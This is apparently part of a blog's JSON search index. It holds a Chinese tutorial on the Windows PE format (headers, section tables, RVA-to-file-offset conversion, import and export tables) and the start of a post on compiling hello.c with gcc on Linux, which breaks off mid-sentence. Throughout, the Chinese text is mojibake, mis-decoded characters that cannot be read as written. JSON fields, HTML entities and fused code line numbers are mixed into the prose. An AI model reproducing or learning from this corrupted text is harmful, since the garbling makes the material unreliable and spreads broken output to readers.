æ–‡ä»¶å¤´ï¼Œè¡¨ç°æ–‡ä»¶å¤§è‡´å±æ€§ï¼Œç»“æ„ä½“ä¸ºIMAGE_FILE_HEADERï¼Œé‡è¦æˆå‘˜æœ‰4ä¸ªï¼š Machineï¼šæ¯ä¸ªCPUéƒ½æ‹¥æœ‰çš„å”¯ä¸€çš„Machineç ï¼Œå…¼å®¹32ä½Intel x86èŠ¯ç‰‡çš„Machineç ä¸º14Cï¼› NumberOfSectionsï¼šæŒ‡å‡ºæ–‡ä»¶ä¸­å­˜åœ¨çš„èŠ‚åŒºæ•°é‡ï¼› SizeOfOptionalHeaderï¼šæŒ‡å‡ºç»“æ„ä½“IMAGE_OPTIONAL_HEADER32ï¼ˆ32ä½ç³»ç»Ÿï¼‰çš„é•¿åº¦ Characteristicsï¼šæ ‡è¯†æ–‡ä»¶å±æ€§ï¼Œæ–‡ä»¶æ˜¯å¦æ˜¯å¯è¿è¡Œå½¢æ€ã€æ˜¯å¦ä¸ºDLLç­‰ï¼Œä»¥bit ORå½¢å¼è¿›è¡Œç»„åˆ å¯é€‰å¤´ï¼Œç»“æ„ä½“ä¸ºIMAGE_OPTIONAL_HEADER32ï¼Œé‡è¦æˆå‘˜æœ‰9ä¸ªï¼š Magicï¼šIMAGE_OPTIONAL_HEADER32ä¸º10Bï¼ŒIMAGE_OPTIONAL_HEADER64ä¸º20B AddressOfEntryPointï¼šæŒæœ‰EPçš„RVAå€¼ï¼ŒæŒ‡å‡ºç¨‹åºæœ€å…ˆæ‰§è¡Œçš„ä»£ç èµ·å§‹åœ°å€ ImageBaseï¼šæŒ‡å‡ºæ–‡ä»¶çš„ä¼˜å…ˆè£…å…¥åœ°å€ï¼ˆ32ä½è¿›ç¨‹è™šæ‹Ÿå†…å­˜èŒƒå›´ä¸ºï¼š0ï½7FFFFFFFï¼‰ SectionAlignment,FileAlignmentï¼šå‰è€…åˆ¶å®šäº†èŠ‚åŒºåœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½ï¼Œåè€…åˆ¶å®šäº†èŠ‚åŒºåœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„æœ€å°å•ä½ SizeOfImageï¼šæŒ‡å®šäº†PE Imageåœ¨è™šæ‹Ÿå†…å­˜ä¸­æ‰€å ç©ºé—´çš„å¤§å° SizeOfHeadersï¼šæŒ‡å‡ºæ•´ä¸ªPEå¤´çš„å¤§å° Subsystemï¼šåŒºåˆ†ç³»ç»Ÿé©±åŠ¨æ–‡ä»¶å’Œæ™®é€šå¯æ‰§è¡Œæ–‡ä»¶ NumberOfRvaAndSizeï¼šæŒ‡å®šDataDirectoryæ•°ç»„çš„ä¸ªæ•° DataDirectoryï¼šç”±IMAGE_DATA_DIRECTORYç»“æ„ä½“ç»„æˆçš„æ•°ç»„ èŠ‚åŒºå¤´ èŠ‚åŒºå¤´å®šä¹‰äº†å„èŠ‚åŒºçš„å±æ€§ã€‚PEæ–‡ä»¶ä¸­codeã€dataã€resourceç­‰æŒ‰ç…§å±æ€§å‚¨å­˜åœ¨ä¸åŒçš„èŠ‚åŒºã€‚å¥½å¤„æ˜¯å¯ä»¥ä¿è¯ç¨‹åºçš„å®‰å…¨æ€§ï¼Œå°†ä»£ç å’Œæ•°æ®åˆ†éš”å¼€ï¼Œæ¯ä¸ªèŠ‚åŒºè®¾è®¡ä¸åŒçš„è®¿é—®æƒé™ã€‚ | ç±»åˆ« | è®¿é—®æƒé™æƒé™ || â€”â€”â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€” || code | æ‰§è¡Œã€è¯»å–æƒé™ || data | éæ‰§è¡Œã€è¯»å†™æƒé™ || resource | éæ‰§è¡Œã€è¯»å–æƒé™ | èŠ‚åŒºå¤´ä¸­å®šä¹‰äº†å„èŠ‚åŒºçš„å±æ€§ï¼ŒåŒ…æ‹¬ä¸åŒçš„ç‰¹æ€§ã€è®¿é—®æƒé™ç­‰ï¼Œç»“æ„ä½“ä¸ºIMAGE_SECTION_HEADERï¼Œé‡è¦æˆå‘˜æœ‰5ä¸ªï¼š VirtualSizeï¼šå†…å­˜ä¸­èŠ‚åŒºæ‰€å å¤§å° VirtualAddressï¼šå†…å­˜ä¸­èŠ‚åŒºèµ·å§‹åœ°å€ï¼ˆRVAï¼‰ SizeOfRawDataï¼šç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºæ‰€å å¤§å° Charateristicsï¼šèŠ‚åŒºå±æ€§ï¼ˆbit ORï¼‰ å†…å­˜æ˜ å°„(RVA_to_RAW)å·¦è¾¹æ–‡ä»¶ä¸­ä½¿ç”¨åç§»ï¼ˆoffsetï¼‰ï¼Œå†…å­˜ä¸­ä½¿ç”¨VAï¼ˆVirtual Addressï¼Œè™šæ‹Ÿåœ°å€ï¼‰æ¥è¡¨ç¤ºä½ç½®ã€‚æ–‡ä»¶åŠ è½½åˆ°å†…å­˜æ—¶ï¼Œæƒ…å†µå°±ä¼šå‘ç”Ÿå˜åŒ–ï¼ˆèŠ‚åŒºå¤§å°ã€ä½ç½®ç­‰ï¼‰ã€‚æ–‡ä»¶çš„å†…å®¹ä¸€èˆ¬å¯åˆ†ä¸ºä»£ç ï¼ˆ.textï¼‰ã€æ•°æ®ï¼ˆ.dataï¼‰ã€èµ„æºï¼ˆ.rsrcï¼‰èŠ‚ï¼Œåˆ†åˆ«ä¿å­˜ã€‚PEå¤´ä¸å„èŠ‚åŒºçš„å°¾éƒ¨å­˜åœ¨ä¸€ä¸ªåŒºåŸŸï¼Œæˆä¸ºNULLå¡«å……ã€‚æ–‡ä»¶/å†…å­˜ä¸­èŠ‚åŒºçš„èµ·å§‹ä½ç½®åº”è¯¥åœ¨å„æ–‡ä»¶/å†…å­˜æœ€å°å•ä½çš„å€æ•°ä¸Šï¼Œç©ºç™½åŒºåŸŸä½¿ç”¨NULLè¿›è¡Œå¡«å……ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ã€‚ VA: Virtual Address è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç»å¯¹åœ°å€ RVA: Relative Virtual Address ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ŒæŒ‡ä»æŸä¸ªåŸºå‡†ä½ç½®å¼€å§‹çš„ç›¸å¯¹åœ°å€ ImageBase: PEæ–‡ä»¶çš„ä¼˜å…ˆè£…è½½åœ°å€ è½¬æ¢å…³ç³»å¦‚ä¸‹ï¼š RVA+ImageBase=VAWhy use VA and RVA? PEå¤´å†…éƒ¨ä¿¡æ¯å¤§å¤šä»¥RVAå½¢å¼å­˜åœ¨ã€‚PEæ–‡ä»¶ï¼ˆä¸»è¦æ˜¯DLLï¼‰åŠ è½½åˆ°è¿›ç¨‹è™šæ‹Ÿå†…å­˜çš„ç‰¹å®šä½ç½®æ—¶ï¼Œè¯¥ä½ç½®å¯èƒ½å·²ç»åŠ è½½äº†å…¶ä»–PEæ–‡ä»¶ã€‚æ­¤æ—¶å¿…é¡»é€šè¿‡é‡å®šä½å°†å…¶åŠ è½½åˆ°å…¶ä»–ç©ºç™½ä½ç½®ï¼Œè‹¥PEå¤´ç”¨çš„æ˜¯VAï¼Œåˆ™ä¼šé€ æˆæ— æ³•æ­£å¸¸è®¿é—®ã€‚å› æ­¤ä½¿ç”¨RVAæ¥å®šä½ä¿¡æ¯ï¼Œå³ä½¿å‘ç”Ÿé‡å®šä½ï¼Œåªè¦ç›¸å¯¹äºåŸºå‡†çš„ç›¸å¯¹åœ°å€æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œå°±èƒ½æ­£å¸¸è®¿é—®åˆ°æŒ‡å®šä¿¡æ¯ä¸ä¼šå‘ç”Ÿé—®é¢˜ã€‚ Demo: If RVA=5000, File Offset=? â‘ é¦–å…ˆæŸ¥æ‰¾RVAå¯¹åº”æ‰€åœ¨çš„èŠ‚åŒº â†’ä½äºç¬¬ä¸€ä¸ªèŠ‚åŒº(.text) å›¾ä¸­ImageBase(01000000) â‘¡è®¡ç®—å…¬å¼ â†’ RAW=RVA-VirtualAddress+PointerToRawData\\\\ =5000-1000+400=44002.Whatâ€™s IATIAT: Import Address Table å¯¼å…¥åœ°å€è¡¨ã€‚ è¿™ä¸ªè¡¨ä¿å­˜äº†ä¸windowsæ“ä½œç³»ç»Ÿæ ¸å¿ƒè¿›ç¨‹ã€å†…å­˜ã€DLLç»“æ„ç­‰ç›¸å…³çš„ä¿¡æ¯ã€‚åªè¦äº†ç†è§£äº†IATï¼Œå°±æŒæ¡äº†Windowsæ“ä½œç³»ç»Ÿçš„æ ¹åŸºã€‚IATæ˜¯ä¸€ç§è¡¨æ ¼ï¼Œç”¨æ¥è®°å½•ç¨‹åºæ­£åœ¨ä½¿ç”¨å“ªäº›åº“ä¸­çš„å“ªäº›å‡½æ•°ã€‚ å…ˆäº†è§£ä¸€ä¸‹Windowsçš„DDL DLLï¼šDynamic Linked Library åŠ¨æ€é“¾æ¥åº“ ä¸æŠŠå‡½æ•°åº“åŒ…å«è¿›åº”ç”¨ç¨‹åºä¸­ï¼Œå•ç‹¬ç»„æˆDLLæ–‡ä»¶ï¼Œåœ¨éœ€è¦ä½¿ç”¨æ—¶å†è¿›è¡Œè°ƒç”¨ã€‚ ä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯å°†åŠ è½½åçš„DLLä»£ç ã€èµ„æºåœ¨å¤šä¸ªè¿›ç¨‹ä¸­å®ç°å…±äº«ã€‚ åœ¨å¯¹å‡½æ•°åº“è¿›è¡Œæ›´æ–°æ—¶ï¼Œåªæ›´æ–°DLLæ–‡ä»¶ï¼Œç®€å•æ˜“è¡Œ DLLåŠ è½½æ–¹å¼æœ‰ä¸¤ç§ï¼šæ˜¾å¼é“¾æ¥ï¼ˆExplicit Linkingï¼‰ å’Œ éšå¼é“¾æ¥ï¼ˆImplicit Linkingï¼‰ æ˜¾ç¤ºé“¾æ¥ï¼šç¨‹åºåœ¨ä½¿ç”¨DLLæ—¶è¿›è¡ŒåŠ è½½ï¼Œä½¿ç”¨å®Œæ¯•åé‡Šæ”¾å†…å­˜ éšå¼é“¾æ¥ï¼šç¨‹åºåœ¨å¼€å§‹æ—¶å³ä¸€åŒåŠ è½½DLLï¼Œç¨‹åºç»ˆæ­¢æ—¶å†é‡Šæ”¾å ç”¨çš„å†…å­˜ IATæä¾›çš„æœºåˆ¶ä¸DLLçš„éšå¼é“¾æ¥æœ‰å…³ ç¨‹åºè°ƒç”¨ç³»ç»ŸIATè¡¨çš„æ—¶å€™å…·ä½“å®ç°è¿‡ç¨‹ï¼š å‡è®¾æˆ‘ä»¬ç¨‹åºä¸­æŸå¤„è¦ç”¨åˆ°MessageBoxAï¼Œé‚£ä¹ˆè¿™é‡Œä¼šæœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ç§æ˜¯å…ˆcallåˆ°ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€ä¸­æ˜¯ä¸€ä¸ªjmp [A]ï¼ŒAä¸­å­˜æ”¾ç€æ•°æ®ï¼Œæ•°æ®å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„MessageBoxçš„å…¥å£åœ°å€ã€‚å¦ä¸€ç§æƒ…å†µæ˜¯ç›´æ¥calllåˆ°MessageBoxAçš„å…¥å£åœ°å€å³ [A],[A]æ˜¯Aåœ°å€å­˜æ”¾çš„æ•°æ®ï¼ŒAä¸­å­˜æ”¾çš„æ•°æ®æ˜¯MessageBoxçš„å…¥å£åœ°å€ï¼Œä¹‹æ‰€ä»¥å«åšè¡¨ä¹Ÿæ˜¯è¿™ä¸ªåŸå› ï¼Œå› ä¸ºç¨‹åºè¦è°ƒç”¨å¾ˆå¤šç³»ç»Ÿdllï¼Œå¦‚æœæˆ‘ä»¬çš„dllåœ°å€å‘ç”Ÿæ”¹å˜ï¼Œè¦å¯¹æ¯ä¸€å¤„è°ƒç”¨ä¿®æ”¹å…¶è°ƒç”¨åœ°å€æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œå¦‚æœæœ‰è¿™æ ·çš„è¡¨ï¼Œæˆ‘ä»¬å°†æ‰€æœ‰çš„å‡½æ•°è°ƒç”¨çš„å…¥å£åœ°å€é›†ä¸­åœ¨ä¸€ä¸ªé›†ä¸­çš„åœ°å€ä¸­ï¼Œç„¶åé€šè¿‡è§£æè¿™ä¸ªè¡¨æ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·æˆ‘ä»¬åªè¦ä¿®æ”¹è¿™ä¸ªè¡¨æ‰€æŒ‡çš„å‡½æ•°å…¥å£åœ°å€ã€‚ æˆ‘ä»¬åœ¨ODä¸­é€‰æ‹©calläº†MessageBoxçš„ä¸€è¡Œï¼Œç”¨view è¿è¡Œæ–‡ä»¶çš„æ–¹æ³•æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå¹¶ä¸æ˜¯å‡½æ•°å…¥å£åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªdwordçš„æ•°ï¼Œè¿™ä¸ªåå…­è¿›åˆ¶æ•°åŠ ä¸ŠåŸºå€å‡è®¾å«åšBï¼Œæˆ‘ä»¬è·³è¿‡å»çœ‹Bï¼Œçœ‹åˆ°Bä¸­çš„æ•°æ®æ˜¯ä¸€ä¸ªASCIIç çš„å†…å®¹ï¼Œå³å­—ç¬¦ä¸²MessageBoxï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒWindowsåœ¨è¿è¡Œç¨‹åºï¼Œå³åœ¨åŠ è½½å‰é€šè¿‡å†…éƒ¨å®ç°ï¼ŒæŠŠæˆ‘ä»¬çš„å­—ç¬¦ä¸²MessageBoxæ¢ä¸ºäº†MessageBoxçš„å…¥å£åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨call ã€Aã€‘çš„æ—¶å€™å°±æ˜¯è·³è½¬åˆ°äº†MessageBoxçš„å…¥å£åœ°å€ã€‚ ä¸‹é¢å¼•å…¥ä¸€ä¸ªç»“æ„ä½“ IMAGE_IMPORT_DESCRIPTOR è¯¥ç»“æ„ä½“ä½äº IMAGE_OPTIONAL_HEADER çš„ IMAGE_DATA_DIRECTORY ä¸­å®šä½åˆ°ç¬¬äºŒä¸ªç›®å½•ï¼Œå³ IMAGE_DIRECTORY_ENTRY_IMPORTã€‚è¯¥ç»“æ„ä½“ä¿å­˜äº†å¯¼å…¥å‡½æ•°çš„ RVA åœ°å€ï¼Œé€šè¿‡è¯¥ RVA åœ°å€å¯ä»¥å®šä½åˆ°å¯¼å…¥è¡¨çš„å…·ä½“ä½ç½®ã€‚ æ¯ä¸€ä¸ªå¯¼å…¥çš„ DLL éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ IMAGE_IMPORT_DESCRIPTORï¼Œå¹¶ä¸”ä»¥æ•°ç»„çš„å½¢å¼å­˜æ”¾åœ¨æ–‡ä»¶ä¸­çš„,å®šä¹‰å¦‚ä¸‹ 12345678910111213141516171819typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; DWORD OriginalFirstThunk;//è¯¥å­—æ®µæŒ‡å‘å¯¼å…¥åç§°è¡¨ï¼ˆINTï¼‰ï¼Œè¯¥RVAæ˜¯ä¸€ä¸ªIMAGE_THUNK_DATAç»“æ„ä½“ &#125;; DWORD TimeDateStamp;//å¯ä»¥å¿½ç•¥ï¼Œä¸€èˆ¬ä¸º0 DWORD ForwarderChain;//ä¸€èˆ¬ä¸º0 DWORD Name;//æŒ‡å‘DLLçš„åç§°çš„RVAåœ°å€ DWORD FirstThunk;//è¯¥å­—æ®µåŒ…å«å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰çš„RVAï¼ŒIATæ˜¯ä¸€ä¸ªIMAGE_THUNK_DATAç»“æ„ä½“æ•°ç»„&#125; IMAGE_IMPORT_DESCRIPTOR; å¯¼å…¥ä¿¡æ¯å¹¶ä¸åŒ…å«æŒ‡å®šå¯¼å…¥è¡¨çš„ä¸ªæ•°ï¼Œè€Œæ˜¯ä»¥ä¸€ä¸ªå…¨ä¸º0çš„IMAGE_IMPORT_DESCRIPTOR ç»“æ„ä½“ä½œä¸ºç»“æŸæ ‡å¿—ã€‚ ä¸‹é¢æ˜¯IMAGE_THUNK_DATA ç»“æ„ä½“çš„å®šä¹‰: 123456789101112131415typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // ä¸€ä¸ªRVAåœ°å€ï¼ŒæŒ‡å‘forwarder string DWORD Function; // PDWORDï¼Œè¢«å¯¼å…¥çš„å‡½æ•°çš„å…¥å£åœ°å€ DWORD Ordinal; // è¯¥å‡½æ•°çš„åºæ•° DWORD AddressOfData; // ä¸€ä¸ªRVAåœ°å€ï¼ŒæŒ‡å‘IMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32; æ¯ä¸€ä¸ª IMAGE_THUNK_DATA å¯¹åº”ä¸€ä¸ª DLL ä¸­çš„å¯¼å…¥å‡½æ•°ã€‚ä¸ IMAGE_IMPORT_DESCRIPTOR ç±»ä¼¼ï¼ŒIMAGE_THUNK_DATA åœ¨æ–‡ä»¶ä¸­ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä»¥ä¸€ä¸ªå…¨ä¸º â€œ0â€ çš„ IMAGE_THUNK_DATA ç»“æŸã€‚ å½“è¯¥ç»“æ„ä½“å€¼çš„æœ€é«˜ä½ä¸º 0 æ—¶ï¼Œè¡¨ç¤ºå‡½æ•°ä»¥å‡½æ•°åå­—ç¬¦ä¸²çš„æ–¹å¼å¯¼å…¥ï¼Œè¿™æ—¶è¯¥ DWORD çš„å€¼è¡¨ç¤ºä¸€ä¸ª RVAï¼Œå¹¶æŒ‡å‘ä¸€ä¸ª IMAGE_IMPORT_BY_NAME ç»“æ„ä½“ï¼š 1234567typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; //è¯¥å‡½æ•°çš„å¯¼å‡ºåºæ•° BYTE Name[1]; // è¯¥å‡½æ•°çš„åå­—&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; çœ‹èµ·æ¥å¯èƒ½æœ‰äº›ç»•ï¼Œä¸€ä¼šIATä¸€ä¼šINTçš„ The difference between IAT and INT: IMAGE_IMPORT_DESCRIPTORç»“æ„ä½“ä¸­çš„OriginalFirstThunkå’ŒFirstThunkéƒ½æŒ‡å‘IMAGE_THUNK_DATAç»“æ„ä½“ã€‚ å½“æ–‡ä»¶åœ¨ç£ç›˜ä¸Šæ—¶ï¼Œä¸¤è€…æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ª IMAGE_THUNK_DATAï¼Œè€Œå½“æ–‡ä»¶è½½å…¥å†…å­˜æ—¶ OriginalFirstThunk ä¸­ä¿å­˜çš„ä»ç„¶æ˜¯æŒ‡å‘å‡½æ•°çš„ RVAï¼Œè€Œ FirstThunk æŒ‡å‘çš„å†…å­˜å˜æˆäº†ç”±è£…è½½å™¨å¡«å……çš„å¯¼å…¥å‡½æ•°åœ°å€ï¼Œå³ IATã€‚ Look at this pictures:) æ“ä½œç³»ç»Ÿå¡«å……IATå¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š 1.æ‰¾åˆ°å¯¼å…¥è¡¨èµ·å§‹åœ°å€ 2.æ‰¾åˆ°ç¬¬ä¸€ä¸ªIID 3.æ ¹æ®IIDçš„ç¬¬å››ä¸ªå­—æ®µç¡®å®šdllåº“åç§° 4.æ ¹æ®IIDçš„ç¬¬äº”ä¸ªå­—æ®µç¡®å®šIATè¡¨åœ°å€ 5.é€šè¿‡IATå­—ç¬¦ä¸²æŒ‡é’ˆå®šä½åˆ°ç›®æ ‡å‡½æ•°åç§°ã€‚ 6.ç”¨ç›®æ ‡å‡½æ•°åœ°å€ä¿®æ”¹IATçš„å­—ç¬¦ä¸²æŒ‡é’ˆã€‚ 7.ä¿®æ”¹ä¸‹ä¸€å¤„IAT 8.IATé¡¹ä¸º0ï¼Œä¿®æ”¹å®Œæ¯• 9.æ‰¾åˆ°ä¸‹ä¸€ä¸ªIIDä»ç¬¬3æ­¥å¼€å§‹é‡å¤ä¸Šé¢çš„æ“ä½œã€‚ Whatâ€™s EATä¸INTç›¸å¯¹åº”ï¼ŒEATï¼ˆExoprt Adress Tableï¼‰é¡¾åæ€ä¹‰ï¼Œå¯¼å‡ºè¡¨ã€‚ EATæ˜¯ä¸€ç§æ ¸å¿ƒæœºåˆ¶ï¼Œä½¿ä¸åŒçš„åº”ç”¨ç¨‹åºå¯ä»¥è°ƒç”¨åº“æ–‡ä»¶ä¸­æä¾›çš„å‡½æ•°ï¼Œåªæœ‰é€šè¿‡EATæ‰èƒ½å‡†ç¡®æ±‚å¾—ä»ç›¸åº”åº“ä¸­åˆ°å¤„å‡½æ•°çš„èµ·å§‹åœ°å€ã€‚PEæ–‡ä»¶å†…çš„IMAGE_EXPORT_DIRECTORYä¿å­˜ç€å¯¼å‡ºä¿¡æ¯ï¼Œä¸”PEæ–‡ä»¶ä¸­ä»…æœ‰ä¸€ä¸ªç”¨æ¥è¯´æ˜EATçš„IMAGE_EXPORT_DIRECTORYç»“æ„ä½“ã€‚ï¼ˆè¿™ç‚¹å¯¹æ¯”IATï¼šIATçš„ IMAGE_IMPORT_DESCRIPTORç»“æ„ä½“ä»¥æ•°ç»„å½¢å¼å­˜åœ¨ï¼Œä¸”æœ‰å¤šä¸ªæˆå‘˜ï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºPEæ–‡ä»¶å¯ä»¥åŒæ—¶å¯¼å…¥å¤šä¸ªåº“ã€‚ EATç»“æ„ä½“ä½äºPEå¤´ä¸­ï¼ŒIMAGE_OPTIONAL_HEADER32.DataDirectory[0] IMAGE_EXPORT_DIRECTORYç»“æ„ï¼š ä¾æ—§å…ˆæ”¾ç»“æ„ä½“å®šä¹‰ 1234567891011121314typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; //ä¿ç•™ æ€»æ˜¯å®šä¹‰ä¸º0 DWORD TimeDateStamp; //æ–‡ä»¶ç”Ÿæˆæ—¶é—´ WORD MajorVersion; //ä¸»ç‰ˆæœ¬å· ä¸€èˆ¬ä¸èµ‹å€¼ WORD MinorVersion; //æ¬¡ç‰ˆæœ¬å· ä¸€èˆ¬ä¸èµ‹å€¼ DWORD Name; //æ¨¡å—çš„çœŸå®åç§° DWORD Base; //ç´¢å¼•åŸºæ•° åŠ ä¸Šåºæ•°å°±æ˜¯å‡½æ•°åœ°å€æ•°ç»„çš„ç´¢å¼•å€¼ DWORD NumberOfFunctions; //åœ°å€è¡¨ä¸­ä¸ªæ•° DWORD NumberOfNames; //åç§°è¡¨çš„ä¸ªæ•° DWORD AddressOfFunctions; //è¾“å‡ºå‡½æ•°åœ°å€çš„RVA DWORD AddressOfNames; //è¾“å‡ºå‡½æ•°åå­—çš„RVA DWORD AddressOfNameOrdinals; //è¾“å‡ºå‡½æ•°åºå·çš„RVA&#125; IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY; Demo: kernel32.dll ä»åº“ä¸­è·å¾—å‡½æ•°åœ°å€çš„APIä¸ºGetProcAddress()å‡½æ•°ï¼Œè¯¥APIå¼•ç”¨EATæ¥è·å–æŒ‡å®šAPIçš„åœ°å€ã€‚å…¶è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š åˆ©ç”¨AddressOfNameæˆå‘˜è½¬åˆ°â€œå‡½æ•°åç§°æ•°ç»„â€ â€œå‡½æ•°åç§°æ•°ç»„â€ä¸­å­˜å‚¨ç€å­—ç¬¦ä¸²åœ°å€ï¼Œé€šè¿‡æ¯”è¾ƒï¼ˆstrcmpï¼‰å­—ç¬¦ä¸²ï¼ŒæŸ¥æ‰¾æŒ‡å®šçš„å‡½æ•°åç§°ï¼ˆæ­¤æ—¶æ•°ç»„çš„ç´¢å¼•ç§°ä¸ºname_indexï¼‰ åˆ©ç”¨AddressOfNameOrdinalsæˆå‘˜ï¼Œè½¬åˆ°ordinalæ•°ç»„ åœ¨ordinalæ•°ç»„ä¸­é€šè¿‡name_indexæŸ¥æ‰¾ç›¸åº”ordinalå€¼ åˆ©ç”¨AddressOfFunctionisæˆå‘˜è½¬åˆ°â€œå‡½æ•°åœ°å€æ•°ç»„â€ï¼ˆEATï¼‰ åœ¨â€œå‡½æ•°åœ°å€æ•°ç»„â€ä¸­å°†åˆšåˆšæ±‚å¾—çš„ordinalç”¨ä½œæ•°ç»„ç´¢å¼•ï¼Œè·å¾—æŒ‡å®šå‡½æ•°çš„èµ·å§‹åœ°å€ SummaryPEæ–‡ä»¶æ˜¯é€†å‘çš„ä¸€ä¸ªåŸºç¡€ï¼Œäº†è§£PEæ–‡ä»¶çš„ç»“æ„å’ŒåŠ¨æ€è¿æ¥çš„è¿‡ç¨‹æœ‰åˆ©äºæˆ‘ä»¬æ›´å¥½åœ°ç†è§£é«˜çº§è°ƒè¯•ã€‚","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"PEæ–‡ä»¶","slug":"PEæ–‡ä»¶","permalink":"http://example.com/tags/PE%E6%96%87%E4%BB%B6/"}]},{"title":"Linuxä»£ç ç¼–è¯‘è¿‡ç¨‹","slug":"Linuxç¯å¢ƒä¸‹ç¼–è¯‘è¿‡ç¨‹","date":"2021-05-12T17:24:39.000Z","updated":"2022-03-25T13:51:43.000Z","comments":true,"path":"2021/05/13/Linuxç¯å¢ƒä¸‹ç¼–è¯‘è¿‡ç¨‹/","link":"","permalink":"http://example.com/2021/05/13/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/","excerpt":"","text":"Linuxä¸‹Hello Worldçš„å‰ç”Ÿä»Šä¸–ä»£ç å¼•å…¥hello.c 1234567#include &lt;stdio.h&gt;int main(int argc,char *argv[],char *envp[])&#123; printf(&quot;Hello World\\n&quot;); return 0;&#125; linuxç¯å¢ƒä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡GCCç¼–è¯‘hello.c: 1$ gcc -g hello.c -o hello å½“å‰ç›®å½•å…ˆä¼šç”Ÿæˆhelloå¯æ‰§è¡Œæ–‡ä»¶ã€‚ mainå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°int argc intå‹å˜é‡ï¼Œè¡¨ç¤ºä¼ é€’ç»™mainå‡½æ•°çš„å‚æ•°æ•°é‡ã€‚ char *argv æŒ‡é’ˆæ•°ç»„ï¼Œæ¯ä¸ªæŒ‡é’ˆæŒ‡å‘å„ä¸ªå…·ä½“çš„å‚æ•°ã€‚ char*envp ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä¸ºç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨ç¯å¢ƒå˜é‡åšå‚è€ƒã€‚ Demo: 1$ ./hello //æ‰§è¡Œè¯¥æ–‡ä»¶ æ­¤æ—¶argc=1,è¡¨ç¤ºåªæœ‰ä¸€ä¸ªå‚æ•°è¾“å…¥ argvåªæœ‰ä¸€ä¸ªå…ƒç´ ,argv[0]æŒ‡å‘è¾“å…¥ç¨‹åºè·¯å¾„åŠåç§°: ./hello 1$ ./hello para_1 æ­¤æ—¶argc=2,æœ‰ä¸¤ä¸ªå‚æ•°ä¼ å…¥ argc[0]æŒ‡å‘è¾“å…¥ç¨‹åºè·¯å¾„åŠåç§° â€œ./helloâ€ argv[1]æŒ‡å‘para_1å­—ç¬¦ä¸² whatâ€™s gccGCCæ˜¯GNU Compiler Collectionçš„ç¼©å†™ï¼ŒGCCæ˜¯ä¸€ç³»åˆ—ç¼–è¯‘å™¨çš„é›†åˆï¼Œæ˜¯Linuxæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚GCCæœ€åˆåä¸ºGNU C Compilerï¼Œå½“æ—¶å®ƒåªæ˜¯ä¸€æ¬¾Cè¯­è¨€çš„ç¼–è¯‘å™¨ï¼Œä¸è¿‡éšç€åç»­è¿­ä»£ï¼Œå®ƒæ”¯æŒC++ã€Fortranã€Goç­‰è¯­è¨€ï¼ŒGCCä¹Ÿå› æ­¤æˆä¸ºä¸€ä¸ªç¼–è¯‘å™¨é›†åˆã€‚GCCæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š GCCæ”¯æŒçš„ç¼–ç¨‹è¯­è¨€å¤šã€‚æ¯”å¦‚ï¼Œg++æ˜¯C++ç¼–è¯‘å™¨ï¼Œgfortranæ˜¯Fortranç¼–è¯‘å™¨ã€‚ GCCæ”¯æŒçš„ç¡¬ä»¶å…¨ã€‚GCCå¯ä»¥å°†æºä»£ç ç¼–è¯‘æˆx86_64ã€ARMã€PowerPCç­‰ç¡¬ä»¶æ¶æ„å¹³å°çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ GCCæ”¯æŒä¼—å¤šä¸šç•Œæ ‡å‡†ã€‚GCCèƒ½å¾ˆå¿«æ”¯æŒæœ€æ–°çš„C++æ ‡å‡†ï¼ŒGCCæ”¯æŒOpenMPã€OpenACCã€‚ ç¼–è¯‘è¿‡ç¨‹åˆ†æ é¢„å¤„ç†é¢„å¤„ç†å™¨CPPå·¥å…·è¿›è¡Œé¢„å¤„ç† 1$ cpp hello.c -o hello.i é¢„ç¼–è¯‘ä¸»è¦å¤„ç†æºä»£ç 